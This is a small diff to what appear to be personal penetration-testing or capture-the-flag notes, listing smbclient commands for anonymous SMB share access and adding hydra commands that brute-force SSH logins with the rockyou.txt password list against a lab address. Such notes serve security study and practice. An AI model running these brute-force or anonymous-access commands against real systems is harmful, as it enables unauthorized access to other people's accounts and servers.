@@ -35,3 +35,8 @@
         # smbclient -L ip_address (to list)
         # smblient -L ip_address -N  (list with no password prompt login with guest or anonymous)
         # smbclient //ip_address/shareName -N  (anonymous login to access pulic share)
+
+    -- ssh
+        # hydra -L user.txt -P rockyou.txt ssh://10.10.131.81
+        # hydra -l username -P rockyou.txt ssh://ip_address
+
